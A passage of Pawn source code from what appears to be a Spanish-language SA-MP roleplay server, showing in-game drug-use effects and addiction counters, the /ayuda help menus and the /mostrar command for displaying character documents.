		if((PlayerInfo[playerid][pManoDer] == 69 && PlayerInfo[playerid][pManoDerCant] <= 0) || (PlayerInfo[playerid][pManoIzq] == 69 && PlayerInfo[playerid][pManoIzqCant] <= 0)){SendClientMessage(playerid, Rojo, "* Necesitas un mechero con gas para encender el porro."); return 1;}
		//Quita unidad de droga
		if(PlayerInfo[playerid][pManoDer] == 80){PlayerInfo[playerid][pManoDerCant] --;}
		else if(PlayerInfo[playerid][pManoIzq] == 80){PlayerInfo[playerid][pManoIzqCant] --;}
		//Quita unidad de mechero
		if(PlayerInfo[playerid][pManoDer] == 69){PlayerInfo[playerid][pManoDerCant] --;}
		else if(PlayerInfo[playerid][pManoIzq] == 69){PlayerInfo[playerid][pManoIzqCant] --;}
		//Da efecto de marihuana
		RemovePlayerColorFade(playerid);
		if(PlayerInfo[playerid][pDrConsumida][0] > 80){FlashPlayerScreen(playerid, 0xa8070730, 1, 2); PlayerInfo[playerid][pDrConsumida][0] += 7; GivePlayerHealth(playerid,7.0);}
		else if(PlayerInfo[playerid][pDrConsumida][0] > 60){FlashPlayerScreen(playerid, 0xa8070735, 1, 4); PlayerInfo[playerid][pDrConsumida][0] += 10; GivePlayerHealth(playerid,10.0);}
		else if(PlayerInfo[playerid][pDrConsumida][0] > 40){FlashPlayerScreen(playerid, 0xa8070740, 1, 4); PlayerInfo[playerid][pDrConsumida][0] += 13; GivePlayerHealth(playerid,13.0);}
		else if(PlayerInfo[playerid][pDrConsumida][0] > 20){FlashPlayerScreen(playerid, 0xa8070745, 1, 5); PlayerInfo[playerid][pDrConsumida][0] += 16; GivePlayerHealth(playerid,16.0);}
		else{FlashPlayerScreen(playerid, 0xa8070750, 1, 5); PlayerInfo[playerid][pDrConsumida][0] += 19; GivePlayerHealth(playerid,19.0);}
		GivePlayerDrunkLevel(playerid, 8000);
		//Sube adicción
		PlayerInfo[playerid][pAdiccion][0] += 3;
		if(PlayerInfo[playerid][pAdiccion][0] > 100){PlayerInfo[playerid][pAdiccion][0] = 100;}
		//Sobredosis
		new Float:health;
		GetPlayerHealth(playerid,health);
		if(health >= 215.0)
		{
			SendClientMessage(playerid, NaranjaOscuro, "* Has sufrido una sobredosis por consumir tanta droga en tan poco tiempo.");
			SetPlayerHealth(playerid,0.0);
			RemovePlayerColorFade(playerid);
			return 1;
		}
		DarSobredosis(playerid);
		//Mensajes
		format(string, sizeof(string), "* %s hace un porro de marihuana y lo enciende.", GetPlayerNameRP(playerid));
		ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
		format(string, sizeof(string), "* Te sientes relajado y tranquilo. Tolerancia marihuana: %d/100.", PlayerInfo[playerid][pAdiccion][0]);
		SendClientMessage(playerid, Naranja, string);
		//Da el cigarro
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_SMOKE_CIGGY);
		ApplyAnimation(playerid, "GANGS", "smkcig_prtl", 3.0, 0, 0, 0, 0, 0);
		return 1;
	}
	if(strcmp(opcion,"cocaina",true) == 0)
	{
		if(PlayerInfo[playerid][pManoDer] != 81 && PlayerInfo[playerid][pManoIzq] !=  81){SendClientMessage(playerid, Rojo, "* No tienes una bolsita de cocaína en ninguna mano."); return 1;}
		//Quita unidad de droga
		if(PlayerInfo[playerid][pManoDer] == 81){PlayerInfo[playerid][pManoDerCant] --;}
		else if(PlayerInfo[playerid][pManoIzq] == 81){PlayerInfo[playerid][pManoIzqCant] --;}
		//Da efecto de cocaina y vida
		RemovePlayerColorFade(playerid);
		if(PlayerInfo[playerid][pAdiccion][1] > 80){FlashPlayerScreen(playerid, 0xFFFFFF20, 255, 110); PlayerInfo[playerid][pDrConsumida][1] += 6; GivePlayerHealth(playerid,6.0);}
		else if(PlayerInfo[playerid][pAdiccion][1] > 60){FlashPlayerScreen(playerid, 0xFFFFFF40, 255, 120); PlayerInfo[playerid][pDrConsumida][1] += 12; GivePlayerHealth(playerid,12.0);}
		else if(PlayerInfo[playerid][pAdiccion][1] > 40){FlashPlayerScreen(playerid, 0xFFFFFF70, 255, 130); PlayerInfo[playerid][pDrConsumida][1] += 18; GivePlayerHealth(playerid,18.0);}
		else if(PlayerInfo[playerid][pAdiccion][1] > 20){FlashPlayerScreen(playerid, 0xFFFFFFBB, 255, 140); PlayerInfo[playerid][pDrConsumida][1] += 24; GivePlayerHealth(playerid,24.0);}
		else{FlashPlayerScreen(playerid, 0xFFFFFFFF, 255, 150); PlayerInfo[playerid][pDrConsumida][1] += 30; GivePlayerHealth(playerid,30.0);}
		//Sube adicción
		PlayerInfo[playerid][pAdiccion][1] += 5;
		if(PlayerInfo[playerid][pAdiccion][1] > 100){PlayerInfo[playerid][pAdiccion][1] = 100;}
		//Sobredosis
		new Float:health;
		GetPlayerHealth(playerid,health);
		if(health >= 215.0)
		{
			SendClientMessage(playerid, NaranjaOscuro, "* Has sufrido una sobredosis por consumir tanta droga en tan poco tiempo.");
			SetPlayerHealth(playerid,0.0);
			RemovePlayerColorFade(playerid);
			return 1;
		}
		DarSobredosis(playerid);
		//Mensajes
		format(string, sizeof(string), "* %s esnifa una raya de cocaina.", GetPlayerNameRP(playerid));
		ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
		format(string, sizeof(string), "* Te sientes eufórico y motivado, pero un tanto nervioso. Adicción cocaína: %d/100.", PlayerInfo[playerid][pAdiccion][1]);
		SendClientMessage(playerid, Naranja, string);
		return 1;
	}
	if(strcmp(opcion,"crack",true) == 0)
	{
		if(PlayerInfo[playerid][pManoDer] != 82 && PlayerInfo[playerid][pManoIzq] != 82){SendClientMessage(playerid, Rojo, "* No tienes una bolsita de crack en ninguna mano."); return 1;}
		if(PlayerInfo[playerid][pManoDer] != 69 && PlayerInfo[playerid][pManoIzq] != 69){SendClientMessage(playerid, Rojo, "* Necesitas un mechero con gas para fumar crack."); return 1;}
		if((PlayerInfo[playerid][pManoDer] == 69 && PlayerInfo[playerid][pManoDerCant] <= 0) || (PlayerInfo[playerid][pManoIzq] == 69 && PlayerInfo[playerid][pManoIzqCant] <= 0)){SendClientMessage(playerid, Rojo, "* Necesitas un mechero con gas para fumar crack."); return 1;}
		//Quita unidad de droga
		if(PlayerInfo[playerid][pManoDer] == 82){PlayerInfo[playerid][pManoDerCant] --;}
		else if(PlayerInfo[playerid][pManoIzq] == 82){PlayerInfo[playerid][pManoIzqCant] --;}
		//Quita unidad de mechero
		if(PlayerInfo[playerid][pManoDer] == 69){PlayerInfo[playerid][pManoDerCant] --;}
		else if(PlayerInfo[playerid][pManoIzq] == 69){PlayerInfo[playerid][pManoIzqCant] --;}
		//Da efecto de crack y vida
		RemovePlayerColorFade(playerid);
		if(PlayerInfo[playerid][pAdiccion][2] > 80){FlashPlayerScreen(playerid, 0xFFFFFF05, 210, 70); PlayerInfo[playerid][pDrConsumida][2] += 4; GivePlayerHealth(playerid,4.0);}
		else if(PlayerInfo[playerid][pAdiccion][2] > 60){FlashPlayerScreen(playerid, 0xFFFFFF10, 210, 70); PlayerInfo[playerid][pDrConsumida][2] += 8; GivePlayerHealth(playerid,8.0);}
		else if(PlayerInfo[playerid][pAdiccion][2] > 40){FlashPlayerScreen(playerid, 0xFFFFFF15, 210, 70); PlayerInfo[playerid][pDrConsumida][2] += 12; GivePlayerHealth(playerid,12.0);}
		else if(PlayerInfo[playerid][pAdiccion][2] > 20){FlashPlayerScreen(playerid, 0xFFFFFF20, 210, 70); PlayerInfo[playerid][pDrConsumida][2] += 16; GivePlayerHealth(playerid,16.0);}
		else{FlashPlayerScreen(playerid, 0xFFFFFF25, 210, 70); PlayerInfo[playerid][pDrConsumida][2] += 20; GivePlayerHealth(playerid,20.0);}
		//Sube adicción
		PlayerInfo[playerid][pAdiccion][2] += 12;
		if(PlayerInfo[playerid][pAdiccion][2] > 100){PlayerInfo[playerid][pAdiccion][2] = 100;}
		//Sobredosis
		new Float:health;
		GetPlayerHealth(playerid,health);
		if(health >= 215.0)
		{
			SendClientMessage(playerid, NaranjaOscuro, "* Has sufrido una sobredosis por consumir tanta droga en tan poco tiempo.");
			SetPlayerHealth(playerid,0.0);
			RemovePlayerColorFade(playerid);
			return 1;
		}
		DarSobredosis(playerid);
		//Mensajes
		format(string, sizeof(string), "* %s fuma un poco de crack.", GetPlayerNameRP(playerid));
		ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
		format(string, sizeof(string), "* Te sientes eufórico. Adicción crack: %d/100.", PlayerInfo[playerid][pAdiccion][2]);
		SendClientMessage(playerid, Naranja, string);
		//Anim de fumar crack
		TogglePlayerControllable(playerid, 0);
		ApplyAnimation(playerid,"CRACK","crckidle1",4.1,1,1,1,1,1);
		SetTimerEx("Descongelar", 12000, false, "i", playerid);
		return 1;
	}
	if(strcmp(opcion,"heroina",true) == 0)
	{
	    if(PlayerInfo[playerid][pManoDer] != 83 && PlayerInfo[playerid][pManoIzq] != 83){SendClientMessage(playerid, Rojo, "* No tienes una bolsita de heroína en ninguna mano."); return 1;}
		if(PlayerInfo[playerid][pManoDer] != 69 && PlayerInfo[playerid][pManoIzq] != 69){SendClientMessage(playerid, Rojo, "* Necesitas un mechero con gas para fundir la heroína."); return 1;}
		if((PlayerInfo[playerid][pManoDer] == 69 && PlayerInfo[playerid][pManoDerCant] <= 0) || (PlayerInfo[playerid][pManoIzq] == 69 && PlayerInfo[playerid][pManoIzqCant] <= 0)){SendClientMessage(playerid, Rojo, "* Necesitas un mechero con gas para fundir la heroína."); return 1;}
		//Quita unidad de droga
		if(PlayerInfo[playerid][pManoDer] == 83){PlayerInfo[playerid][pManoDerCant] --;}
		else if(PlayerInfo[playerid][pManoIzq] == 83){PlayerInfo[playerid][pManoIzqCant] --;}
		//Quita unidad de mechero
		if(PlayerInfo[playerid][pManoDer] == 69){PlayerInfo[playerid][pManoDerCant] --;}
		else if(PlayerInfo[playerid][pManoIzq] == 69){PlayerInfo[playerid][pManoIzqCant] --;}
		//Da efecto de heroína y vida
		RemovePlayerColorFade(playerid);
		if(PlayerInfo[playerid][pAdiccion][3] > 80){FlashPlayerScreen(playerid, 0x00000075, 1, 1); PlayerInfo[playerid][pDrConsumida][3] += 8; GivePlayerHealth(playerid,8.0);}
		else if(PlayerInfo[playerid][pAdiccion][3] > 60){FlashPlayerScreen(playerid, 0x00000080, 1, 2); PlayerInfo[playerid][pDrConsumida][3] += 16; GivePlayerHealth(playerid,16.0);}
		else if(PlayerInfo[playerid][pAdiccion][3] > 40){FlashPlayerScreen(playerid, 0x00000085, 1, 3); PlayerInfo[playerid][pDrConsumida][3] += 24; GivePlayerHealth(playerid,24.0);}
		else if(PlayerInfo[playerid][pAdiccion][3] > 20){FlashPlayerScreen(playerid, 0x00000090, 1, 4); PlayerInfo[playerid][pDrConsumida][3] += 32; GivePlayerHealth(playerid,32.0);}
		else{FlashPlayerScreen(playerid, 0x00000095, 1, 4); PlayerInfo[playerid][pDrConsumida][3] += 40; GivePlayerHealth(playerid,40.0);}
		SetPlayerWeather(playerid, 21);
		//Sube adicción
		PlayerInfo[playerid][pAdiccion][3] += 8;
		if(PlayerInfo[playerid][pAdiccion][3] > 100){PlayerInfo[playerid][pAdiccion][3] = 100;}
		//Sobredosis
		new Float:health;
		GetPlayerHealth(playerid,health);
		if(health >= 215.0)
		{
			SendClientMessage(playerid, NaranjaOscuro, "* Has sufrido una sobredosis por consumir tanta droga en tan poco tiempo.");
			SetPlayerHealth(playerid,0.0);
			RemovePlayerColorFade(playerid);
			return 1;
		}
		DarSobredosis(playerid);
		//Mensajes
		format(string, sizeof(string), "* %s se inyecta heroína.", GetPlayerNameRP(playerid));
		ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
		format(string, sizeof(string), "* Una gran sensación de placer te invade y te hace olvidar tus problemas. Adicción heroína: %d/100.", PlayerInfo[playerid][pAdiccion][3]);
		SendClientMessage(playerid, Naranja, string);
		//Anim de meterse heroína
		TogglePlayerControllable(playerid, 0);
		ApplyAnimation(playerid,"CRACK","crckidle1",4.1,1,1,1,1,1);
		SetTimerEx("Descongelar", 30000, false, "i", playerid);
		return 1;
	}
	if(strcmp(opcion,"lsd",true) == 0)
	{
	    if(PlayerInfo[playerid][pManoDer] != 84 && PlayerInfo[playerid][pManoIzq] != 84){SendClientMessage(playerid, Rojo, "* No tienes un tripi de LSD en ninguna mano."); return 1;}
		//Quita unidad de droga
		if(PlayerInfo[playerid][pManoDer] == 84){PlayerInfo[playerid][pManoDerCant] --;}
		else if(PlayerInfo[playerid][pManoIzq] == 84){PlayerInfo[playerid][pManoIzqCant] --;}
		//Da efecto de LSD
		RemovePlayerColorFade(playerid);
		SetTimerEx("DarEfectoLSD", 200, false, "i", playerid);
		if(PlayerInfo[playerid][pAdiccion][4] > 80){PlayerInfo[playerid][pDrConsumida][4] += 5;}
		else if(PlayerInfo[playerid][pAdiccion][4] > 60){PlayerInfo[playerid][pDrConsumida][4] += 10;}
		else if(PlayerInfo[playerid][pAdiccion][4] > 40){PlayerInfo[playerid][pDrConsumida][4] += 15;}
		else if(PlayerInfo[playerid][pAdiccion][4] > 20){PlayerInfo[playerid][pDrConsumida][4] += 20;}
		else{PlayerInfo[playerid][pDrConsumida][4] += 25;}
		//Sube adicción
		PlayerInfo[playerid][pAdiccion][4] += 5;
		if(PlayerInfo[playerid][pAdiccion][4] > 100){PlayerInfo[playerid][pAdiccion][4] = 100;}
		//Sobredosis
		DarSobredosis(playerid);
		//Mensajes
		format(string, sizeof(string), "* %s se coloca un tripi de LSD en la lengua.", GetPlayerNameRP(playerid));
		ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
		format(string, sizeof(string), "* Empiezas a tener alucinaciones y ves cosas extrañas por todas partes. Tolerancia LSD: %d/100.", PlayerInfo[playerid][pAdiccion][4]);
		SendClientMessage(playerid, Naranja, string);
		return 1;
	}
	return 1;
}

//----------COMANDOS GENERALES----------//

if(strcmp(cmd, "/ayuda", true) == 0) //Ir a un sitio concreto
{
    new opcion[128];
    opcion = strtok(cmdtext, idx);
    if(!strlen(opcion))
    {
        SendClientMessage(playerid, Naranja, "* /Ayuda [Opción]");
        SendClientMessage(playerid, Naranja, "General, Telefono, Canales, Trabajo, Faccion, Casa, Negocio, Vehiculo, Lider, Drogas");
        return 1;
    }
    if(strcmp(opcion,"General",true) == 0)
    {
        SendClientMessage(playerid, Amarillo, "Comandos generales:");
        SendClientMessage(playerid, Blanco, "/Cuenta, /(Inv)entario (o Y), /Bol, /Mano, /Usar, /Guardar, /Ceder, /Tirar, /Coger, /Espalda, /Cargador");
        SendClientMessage(playerid, Blanco, "/(Rec)argar, /Aceptar, /ATM (o F), /Parking, /EntrarTaller, /SalirTaller, /Admins, /Animaciones, /Licencias");
        SendClientMessage(playerid, Blanco, "/Trabajo, /Comprar, /Habilidades, /Renunciar, /Comer, /Beber, /Pagar, /Mecaigo, /Reportar, /Hora, /(Int)entar");
        SendClientMessage(playerid, Blanco, "/NameOFF, /BarrasOFF, /Caja, /Entrenar, /VM, /Mostrar, /AutoReparar, /MinPayDay, /Duda, /Fumar, /Entrada");
		return 1;
    }
    if(strcmp(opcion,"Canales",true) == 0)
    {
        SendClientMessage(playerid, Amarillo, "Comandos de canales:");
        SendClientMessage(playerid, Blanco, "/(G)ritar, /(C)erca, /(S)usurrar, /(F)accion, /(R)adio");
        SendClientMessage(playerid, Blanco, "/(Dep)artamentos, /(M)egafono, /B, /Me, /Do, /Yo, /MP, /Idioma");
        return 1;
    }
    if(strcmp(opcion,"Faccion",true) == 0)
    {
		if(PlayerInfo[playerid][pFaccion] == 1) //LSPD
		{
		    if(PlayerInfo[playerid][pFaccion] == 0){SendClientMessage(playerid, Rojo, "* No formas parte de una facción."); return 1;}
			SendClientMessage(playerid, Amarillo, "Comandos LSPD:");
        	SendClientMessage(playerid, Blanco, "/Miembros, /Ap (o H), /Celda, /Vestuario, /Armeria, /RecogerPrueba, /Esposar, /Retener, /(Ref)uerzos");
        	SendClientMessage(playerid, Blanco, "/Mascara, /Laser, /Encarcelar, /Cachear, /Requisar, /Multar, /(M)egafono, /(R)adio, /(Dep)artamentos, /Reanimar");
        	SendClientMessage(playerid, Blanco, "/TrafPoner, /TrafQuitar, /TrafLimpiar, /Remolcar, /Irrumpir, /Registrar, /Confiscar, /Deposito, /Embargar");
        	SendClientMessage(playerid, Blanco, "/APatio, /CPatio, /ForzarMaletero, /ForzarVehiculo, /Sir");
        	return 1;
		}
		if(PlayerInfo[playerid][pFaccion] == 4) //LSN
		{
		    SendClientMessage(playerid, Amarillo, "Comandos LSN:");
        	SendClientMessage(playerid, Blanco, "/Miembros, /Ap (o H), /(N)oticia, /Directo");
        	return 1;
		}
		if(FaccInfo[PlayerInfo[playerid][pFaccion]][fTipo] == 3) //Banda/pandilla
		{
		    SendClientMessage(playerid, Amarillo, "Comandos bandas/pandillas:");
        	SendClientMessage(playerid, Blanco, "/Miembros, /Turf, /Distribuir");
        	return 1;
		}
		if(FaccInfo[PlayerInfo[playerid][pFaccion]][fTipo] == 4) //Mafia
		{
		    SendClientMessage(playerid, Amarillo, "Comandos mafias:");
        	SendClientMessage(playerid, Blanco, "/Miembros, /ContactoArmas, /ContactoDrogas");
        	return 1;
		}
    }
    if(strcmp(opcion,"Vehiculo",true) == 0)
    {
        SendClientMessage(playerid, Amarillo, "Comandos de vehículos:");
        SendClientMessage(playerid, Blanco, "/Motor (o Alt), /Luces (o LCTRL), /Bloqueo, /Gas, /Rellenar, /VenderVeh, /VenderVehA, /LocalizarVeh");
        SendClientMessage(playerid, Blanco, "/SacarDeposito, /Desembargar, /Capo, /(Mal)etero, /Carid, /Oldcar, /Cinturon, /Ventanilla");
        SendClientMessage(playerid, Blanco, "/PrestarLlave, /TirarLlave");
        return 1;
    }
    if(strcmp(opcion,"Lider",true) == 0)
    {
        if(PlayerInfo[playerid][pLider] == 0){SendClientMessage(playerid, Rojo, "* No eres líder de una facción."); return 1;}
        SendClientMessage(playerid, Amarillo, "Comandos de lider:");
        SendClientMessage(playerid, Blanco, "/Reclutar, /Promover, /Expulsar");
        return 1;
    }
    if(strcmp(opcion,"Trabajo",true) == 0)
    {
        if(PlayerInfo[playerid][pTrabajo] == 0){SendClientMessage(playerid, Rojo, "* No tienes trabajo."); return 1;}
        if(PlayerInfo[playerid][pTrabajo] == 1) //Pizzero
        {
            SendClientMessage(playerid, Amarillo, "Comandos de pizzero:");
	        SendClientMessage(playerid, Blanco, "/Trabajar, /DejarTrabajo");
	        return 1;
        }
        if(PlayerInfo[playerid][pTrabajo] == 2) //Barrendero
        {
            SendClientMessage(playerid, Amarillo, "Comandos de barrendero:");
	        SendClientMessage(playerid, Blanco, "/Trabajar, /DejarTrabajo");
	        return 1;
        }
        if(PlayerInfo[playerid][pTrabajo] == 3) //Securicar
        {
            SendClientMessage(playerid, Amarillo, "Comandos de securicar:");
	        SendClientMessage(playerid, Blanco, "/Trabajar, /DejarTrabajo");
	        return 1;
        }
        if(PlayerInfo[playerid][pTrabajo] == 4) //Cosechador
        {
            SendClientMessage(playerid, Amarillo, "Comandos de cosechador:");
	        SendClientMessage(playerid, Blanco, "/Trabajar, /DejarTrabajo");
	        return 1;
        }
        if(PlayerInfo[playerid][pTrabajo] == 5) //Fumigador aéreo
        {
            SendClientMessage(playerid, Amarillo, "Comandos de fumigador aéreo:");
	        SendClientMessage(playerid, Blanco, "/Trabajar, /DejarTrabajo");
	        return 1;
        }
        if(PlayerInfo[playerid][pTrabajo] == 6) //Taxista
        {
            SendClientMessage(playerid, Amarillo, "Comandos de taxista:");
	        SendClientMessage(playerid, Blanco, "/Trabajar, /Taxi, /LlevarTaxi, /DejarTrabajo");
	        return 1;
        }
        if(PlayerInfo[playerid][pTrabajo] == 7) //Mecánico
        {
            SendClientMessage(playerid, Amarillo, "Comandos de mecánico:");
	        SendClientMessage(playerid, Blanco, "/Trabajar, /Reparar, /Repintar, /Remolcar, /DejarTrabajo");
	        return 1;
        }
        if(PlayerInfo[playerid][pTrabajo] == 8) //Ladrón
        {
            SendClientMessage(playerid, Amarillo, "Comandos de ladrón:");
	        SendClientMessage(playerid, Blanco, "/Forzar, /Robar, /Puentear, /Desguazar");
	        return 1;
        }
        if(PlayerInfo[playerid][pTrabajo] == 9) //Pescador
        {
            SendClientMessage(playerid, Amarillo, "Comandos de pescador:");
	        SendClientMessage(playerid, Blanco, "/Trabajar, /DejarTrabajo");
	        return 1;
        }
    }
    if(strcmp(opcion,"Casa",true) == 0)
    {
        SendClientMessage(playerid, Amarillo, "Comandos de casas:");
        SendClientMessage(playerid, Blanco, "/ComprarCasa, /VenderCasa, /Puerta, /Alquilable, /Renta, /Desalojar, /DesalojarTodos");
        SendClientMessage(playerid, Blanco, "/Alquilar, /DesAlquilar, /Armario, /GuardarDinero, /SacarDinero");
        return 1;
    }
    if(strcmp(opcion,"Negocio",true) == 0)
    {
        SendClientMessage(playerid, Amarillo, "Comandos de negocios:");
        SendClientMessage(playerid, Blanco, "/ComprarNegocio, /VenderNegocio, /Puerta, /Armario, /GuardarDinero, /SacarDinero");
        SendClientMessage(playerid, Blanco, "/Contratar, /Despedir, /DespedirTodos, /Plantilla");
        return 1;
    }
    if(strcmp(opcion,"Telefono",true) == 0)
    {
        SendClientMessage(playerid, Amarillo, "Comandos de teléfono:");
        SendClientMessage(playerid, Blanco, "/Llamar, /SMS, /Contestar, /Colgar, /Agenda");
        return 1;
    }
    if(strcmp(opcion,"Drogas",true) == 0)
    {
        SendClientMessage(playerid, Amarillo, "Comandos de drogas:");
        SendClientMessage(playerid, Blanco, "/Consumir, /Plantar, /RecogerPlanta, /EliminarPlanta, /Preparar, /Fardo");
        return 1;
    }
    else
    {
        SendClientMessage(playerid, Naranja, "* /Ayuda [Opción]");
        SendClientMessage(playerid, Naranja, "General, Telefono, Canales, Trabajo, Faccion, Casa, Negocio, Vehiculo, Lider, Drogas");
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/mostrar", true) == 0) //Mostrar documentación IC
{
    new opcion[128];
    opcion = strtok(cmdtext, idx);
    if(!strlen(opcion))
    {
        SendClientMessage(playerid, Naranja, "* /Mostrar [Opción] [ID]");
        SendClientMessage(playerid, Naranja, "DNI, Licencias, PapelesCoche, Placa");
        return 1;
    }
    if(strcmp(opcion,"DNI",true) == 0)
    {
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Mostrar DNI [ID]");
	        return 1;
	    }
	    playerid2 = ReturnUser(tmp);
	    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
	    if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	    format(string, sizeof(string), "* %s muestra su DNI a %s.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    SendClientMessage(playerid2, Amarillo, "-------------------");
 	    format(string, sizeof(string), "Nombre completo: %s", PlayerInfo[playerid][pNombre]);
 	    SendClientMessage(playerid2, Blanco, string);
 	    format(string, sizeof(string), "Edad: %d", PlayerInfo[playerid][pEdad]);
 	    SendClientMessage(playerid2, Blanco, string);
 	    new sexo[5];
 	    if(PlayerInfo[playerid][pSexo] == 2) sexo = "(F)";
 	    else sexo = "(M)";
 	    format(string, sizeof(string), "Sexo: %s", sexo);
 	    SendClientMessage(playerid2, Blanco, string);
 	    SendClientMessage(playerid2, Amarillo, "-------------------");
        return 1;
    }
    if(strcmp(opcion,"Licencias",true) == 0)
    {
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Mostrar Licencias [ID]");
	        return 1;
	    }
	    playerid2 = ReturnUser(tmp);
	    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
	    if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	    format(string, sizeof(string), "* %s muestra sus licencias a %s.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    SendClientMessage(playerid2, Amarillo, "-------------------");
		new tienelicencia[3];
		if(PlayerInfo[playerid][pLicConduccion] == 1) tienelicencia = "Sí";
		else tienelicencia = "No";
 	    format(string, sizeof(string), "Licencia conducción: %s", tienelicencia);
 	    SendClientMessage(playerid2, Blanco, string);
 	    if(PlayerInfo[playerid][pLicAviacion] == 1) tienelicencia = "Sí";
		else tienelicencia = "No";
 	    format(string, sizeof(string), "Licencia aviación: %s", tienelicencia);
 	    SendClientMessage(playerid2, Blanco, string);
 	    if(PlayerInfo[playerid][pLicNavegacion] == 1) tienelicencia = "Sí";
		else tienelicencia = "No";
 	    format(string, sizeof(string), "Licencia navegación: %s", tienelicencia);
 	    SendClientMessage(playerid2, Blanco, string);
 	    if(PlayerInfo[playerid][pLicCaza] == 1) tienelicencia = "Sí";
		else tienelicencia = "No";
 	    format(string, sizeof(string), "Licencia caza: %s", tienelicencia);
 	    SendClientMessage(playerid2, Blanco, string);
 	    if(PlayerInfo[playerid][pLicPesca] == 1) tienelicencia = "Sí";
		else tienelicencia = "No";
 	    format(string, sizeof(string), "Licencia pesca: %s", tienelicencia);
 	    SendClientMessage(playerid2, Blanco, string);
 	    if(PlayerInfo[playerid][pLicArmas] == 1) tienelicencia = "Sí";
		else tienelicencia = "No";
 	    format(string, sizeof(string), "Licencia armas: %s", tienelicencia);
 	    SendClientMessage(playerid2, Blanco, string);
 	    SendClientMessage(playerid2, Amarillo, "-------------------");
        return 1;
    }
    if(strcmp(opcion,"PapelesCoche",true) == 0)
    {
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Mostrar PapelesCoche [ID]");
	        return 1;
	    }
	    playerid2 = ReturnUser(tmp);
	    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
	    if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	    format(string, sizeof(string), "* %s muestra los documentos de sus vehículos a %s.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    SendClientMessage(playerid2, Amarillo, "-------------------");
		for(new x=0; x<5; x++)
		{
		    if(PlayerInfo[playerid][pLlaveCoche][x] == 0)
		    {
		        format(string, sizeof(string), "Slot %d: Vacío", x);
		        SendClientMessage(playerid2, Blanco, string);
		    }
		    else
		    {
		        new carid, string2[250];
		        for(new c=MAX_VEHPUBLICO; c<=TotalVeh; c++)
		        {
		            if(CarInfo[c][cLlave] == PlayerInfo[playerid][pLlaveCoche][x]){carid = c; break;}
		        }
		        format(string2, sizeof(string2), "Slot %d: Matrícula: LS-%d, Modelo: %s, Propietario: %s, Valor: %d", x+1, PlayerInfo[playerid][pLlaveCoche][x], CarInfo[carid][cNombreModelo], CarInfo[carid][cDueno], CarInfo[carid][cValor]);
		        SendClientMessage(playerid2, Blanco, string2);
		    }
		}
 	    SendClientMessage(playerid2, Amarillo, "-------------------");
        return 1;
    }
    if(strcmp(opcion,"Placa",true) == 0)
    {
        if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid, Rojo, "* No eres policía."); return 1;}
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Mostrar Placa [ID]");
	        return 1;
	    }
	    playerid2 = ReturnUser(tmp);
	    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
	    if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	    format(string, sizeof(string), "* %s muestra su placa de agente del LSPD a %s.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    SendClientMessage(playerid2, Amarillo, "-------------------");
 	    format(string, sizeof(string), "Nombre: %s", PlayerInfo[playerid][pNombre]);
 	    SendClientMessage(playerid2, Blanco, string);
 	    switch(PlayerInfo[playerid][pRango])
 	    {
 	    	case 1:
	 	    {
	 	    	format(string, sizeof(string), "Rango: %s", FaccInfo[1][fRango1]);
	 	    	SendClientMessage(playerid2, Blanco, string);
	 	    }
	 	    case 2:
	 	    {
	 	    	format(string, sizeof(string), "Rango: %s", FaccInfo[1][fRango2]);
	 	    	SendClientMessage(playerid2, Blanco, string);
	 	    }
	 	    case 3:
	 	    {
	 	    	format(string, sizeof(string), "Rango: %s", FaccInfo[1][fRango3]);
	 	    	SendClientMessage(playerid2, Blanco, string);
	 	    }
	 	    case 4:
	 	    {
	 	    	format(string, sizeof(string), "Rango: %s", FaccInfo[1][fRango4]);
	 	    	SendClientMessage(playerid2, Blanco, string);
	 	    }
	 	    case 5:
	 	    {
	 	    	format(string, sizeof(string), "Rango: %s", FaccInfo[1][fRango5]);
	 	    	SendClientMessage(playerid2, Blanco, string);
	 	    }
	 	    case 6:
	 	    {
	 	    	format(string, sizeof(string), "Rango: %s", FaccInfo[1][fRango6]);
	 	    	SendClientMessage(playerid2, Blanco, string);
	 	    }
	 	    case 7:
	 	    {
